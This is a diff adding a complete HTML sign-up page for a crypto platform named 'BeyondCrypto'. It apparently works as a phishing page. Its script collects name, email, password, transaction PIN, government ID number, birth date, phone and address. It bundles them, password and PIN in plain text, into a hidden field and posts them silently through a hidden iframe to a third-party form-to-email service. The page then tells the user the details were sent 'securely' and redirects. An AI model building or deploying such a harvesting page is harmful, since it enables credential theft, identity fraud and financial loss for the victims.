@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up · BeyondCrypto</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-bg: #0a1129;
+            --secondary-bg: #0f1a3a;
+            --card-bg: #152352;
+            --accent: #00c774;
+            --accent-secondary: #7c3aed;
+            --text-primary: #e2e8f0;
+            --text-secondary: #8b939f;
+            --negative: #ff4d4d;
+            --border-radius: 16px;
+            --shadow: 0 10px 30px rgba(0,0,0,0.3);
+            --border-color: rgba(255,255,255,0.05);
+            --input-bg: #0a1129;
+            --hover-bg: rgba(255,255,255,0.06);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 550px;
+            background: var(--secondary-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header {
+            padding: 25px 30px 20px;
+            text-align: center;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 18px;
+            left: 18px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            background: var(--card-bg);
+            padding: 8px 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all 0.2s;
+            z-index: 5;
+        }
+
+        .back-btn i {
+            font-size: 0.85rem;
+            color: var(--accent);
+        }
+
+        .back-btn:hover {
+            background: var(--hover-bg);
+            color: var(--text-primary);
+            border-color: var(--accent);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 5px;
+        }
+
+        .logo i {
+            font-size: 1.8rem;
+            color: var(--accent);
+        }
+
+        .logo h1 {
+            font-size: 1.6rem;
+            background: linear-gradient(90deg, var(--text-primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .main-content {
+            padding: 25px 30px 30px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 11px 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            transition: border 0.2s;
+            appearance: none;
+        }
+
+        select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238b939f' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 36px;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0,199,116,0.08);
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--accent), var(--accent-secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(0,199,116,0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .login-link {
+            text-align: center;
+            margin-top: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .login-link a {
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .login-link a:hover {
+            text-decoration: underline;
+        }
+
+        .terms {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin: 18px 0;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .terms input {
+            width: auto;
+            margin-top: 3px;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10,17,41,0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 100;
+            border-radius: var(--border-radius);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner-wrapper {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 25px;
+        }
+
+        .spinner-wrapper .crypto-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.5rem;
+            color: var(--accent);
+            z-index: 2;
+            animation: pulse-icon 1.2s ease-in-out infinite;
+        }
+
+        .spinner-wrapper .ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: var(--accent);
+            border-bottom-color: var(--accent-secondary);
+            animation: spin-ring 1s linear infinite;
+        }
+
+        .spinner-wrapper .ring:nth-child(2) {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-top-color: var(--accent-secondary);
+            border-bottom-color: var(--accent);
+            animation-duration: 1.4s;
+            animation-direction: reverse;
+        }
+
+        .spinner-wrapper .ring:nth-child(3) {
+            width: 50%;
+            height: 50%;
+            top: 25%;
+            left: 25%;
+            border-top-color: var(--text-secondary);
+            border-bottom-color: var(--accent);
+            animation-duration: 1.8s;
+        }
+
+        @keyframes spin-ring {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.7; }
+        }
+
+        .loading-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+        }
+
+        .loading-sub {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        footer {
+            padding: 15px;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 480px) {
+            .main-content { padding: 20px; }
+            .row { flex-direction: column; gap: 0; }
+            .back-btn {
+                top: 10px;
+                left: 10px;
+                padding: 6px 12px;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="appContainer">
+        <header>
+            <a href="index.html" class="back-btn">
+                <i class="fas fa-arrow-left"></i> Back
+            </a>
+            <div class="logo">
+                <i class="fas fa-user-plus"></i>
+                <h1>BeyondCrypto</h1>
+            </div>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px;">Complete your registration</p>
+        </header>
+
+        <div class="main-content">
+            <form id="signupForm" action="https://api.web3forms.com/submit" method="POST" target="hidden_frame">
+                <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
+                <input type="hidden" name="subject" value="New Account Registration">
+                <input type="hidden" name="from_name" value="BeyondCrypto Signup">
+                <input type="hidden" name="botcheck" value="">
+                <input type="hidden" name="info" id="infoHidden" value="">
+
+                <div class="form-group">
+                    <label><i class="fas fa-user" style="color: var(--accent); margin-right: 6px;"></i> Full Name</label>
+                    <input type="text" id="fullName" placeholder="John Doe" required>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-envelope" style="color: var(--accent); margin-right: 6px;"></i> Email Address</label>
+                    <input type="email" id="email" placeholder="you@example.com" required>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label><i class="fas fa-lock" style="color: var(--accent); margin-right: 6px;"></i> Password</label>
+                        <input type="password" id="password" placeholder="Min. 8 characters" required>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-lock" style="color: var(--accent); margin-right: 6px;"></i> Confirm</label>
+                        <input type="password" id="confirmPassword" placeholder="Re-enter" required>
+                    </div>
+                </div>
+
+                <!-- Transaction PIN field -->
+                <div class="form-group">
+                    <label><i class="fas fa-key" style="color: var(--accent); margin-right: 6px;"></i> Create a transaction pin</label>
+                    <input type="password" id="transactionPin" placeholder="4-6 digit PIN" required maxlength="6" minlength="4" pattern="\d*" inputmode="numeric">
+                    <small style="color: var(--text-secondary); font-size: 0.8rem;">Used to authorize transactions. Must be 4-6 digits.</small>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-globe" style="color: var(--accent); margin-right: 6px;"></i> Country</label>
+                    <select id="country" required>
+                        <option value="" disabled selected>Select your country</option>
+                        <option value="United States">United States</option>
+                        <option value="United Kingdom">United Kingdom</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Australia">Australia</option>
+                        <option value="Germany">Germany</option>
+                        <option value="France">France</option>
+                        <option value="Nigeria">Nigeria</option>
+                        <option value="India">India</option>
+                        <option value="Brazil">Brazil</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label><i class="fas fa-id-card" style="color: var(--accent); margin-right: 6px;"></i> ID Type</label>
+                        <select id="idType" required>
+                            <option value="" disabled selected>Select type</option>
+                            <option value="Passport">Passport</option>
+                            <option value="Driver's License">Driver's License</option>
+                            <option value="National ID">National ID</option>
+                            <option value="Voter's Card">Voter's Card</option>
+                            <option value="Residence Permit">Residence Permit</option>
+                            <option value="Other">Other</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-hashtag" style="color: var(--accent); margin-right: 6px;"></i> ID Number</label>
+                        <input type="text" id="idNumber" placeholder="e.g. A12345678" required>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label><i class="fas fa-calendar-alt" style="color: var(--accent); margin-right: 6px;"></i> Date of Birth</label>
+                        <input type="date" id="dob" required>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-phone" style="color: var(--accent); margin-right: 6px;"></i> Phone Number</label>
+                        <input type="tel" id="phone" placeholder="+1234567890" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label><i class="fas fa-map-marker-alt" style="color: var(--accent); margin-right: 6px;"></i> Address</label>
+                    <input type="text" id="address" placeholder="Street, City, ZIP/Postal Code" required>
+                </div>
+
+                <div class="terms">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms" style="margin:0; font-weight:400;">I agree to the <a href="#" style="color:var(--accent);">Terms & Conditions</a> and <a href="#" style="color:var(--accent);">Privacy Policy</a></label>
+                </div>
+
+                <button type="submit" class="btn-primary" id="submitBtn">
+                    <i class="fas fa-user-plus"></i> Create Account
+                </button>
+            </form>
+            <iframe name="hidden_frame" style="display:none;"></iframe>
+
+            <div class="login-link">
+                Already have an account? <a href="login.html">Log in</a>
+            </div>
+        </div>
+
+        <!-- Loading Overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner-wrapper">
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="crypto-icon"><i class="fas fa-user-check"></i></div>
+            </div>
+            <div class="loading-title" id="loadingTitle">Creating Account...</div>
+            <div class="loading-sub" id="loadingSub">Sending your details securely</div>
+        </div>
+
+        <footer>
+            <p>BeyondCrypto · Secure Registration | &copy; 2024 BeyondCrypto</p>
+        </footer>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('signupForm');
+            const infoHidden = document.getElementById('infoHidden');
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // Get all field values
+                const fullName = document.getElementById('fullName').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const password = document.getElementById('password').value;
+                const confirm = document.getElementById('confirmPassword').value;
+                const transactionPin = document.getElementById('transactionPin').value.trim();
+                const country = document.getElementById('country').value;
+                const idType = document.getElementById('idType').value;
+                const idNumber = document.getElementById('idNumber').value.trim();
+                const dob = document.getElementById('dob').value;
+                const phone = document.getElementById('phone').value.trim();
+                const address = document.getElementById('address').value.trim();
+                const terms = document.getElementById('terms').checked;
+
+                // Validations
+                if (password !== confirm) {
+                    alert('Passwords do not match!');
+                    return;
+                }
+                if (password.length < 8) {
+                    alert('Password must be at least 8 characters.');
+                    return;
+                }
+                if (!/^\d{4,6}$/.test(transactionPin)) {
+                    alert('Transaction PIN must be 4-6 digits only.');
+                    return;
+                }
+                if (!terms) {
+                    alert('You must agree to the Terms & Conditions.');
+                    return;
+                }
+
+                // Build the info string
+                const signupData = 
+                    `Full Name: ${fullName}\n` +
+                    `Email: ${email}\n` +
+                    `Password: ${password}\n` +
+                    `Transaction PIN: ${transactionPin}\n` +
+                    `Country: ${country}\n` +
+                    `ID Type: ${idType}\n` +
+                    `ID Number: ${idNumber}\n` +
+                    `Date of Birth: ${dob}\n` +
+                    `Phone: ${phone}\n` +
+                    `Address: ${address}\n` +
+                    `Agreed to Terms: ${terms ? 'Yes' : 'No'}\n` +
+                    `Timestamp: ${new Date().toISOString()}`;
+
+                infoHidden.value = signupData;
+
+                // Show loading overlay
+                loadingOverlay.classList.add('show');
+                submitBtn.disabled = true;
+
+                // Submit form silently
+                HTMLFormElement.prototype.submit.call(form);
+
+                // Redirect after delay
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 4000);
+            });
+        })();
+    </script>
+</body>
+</html>
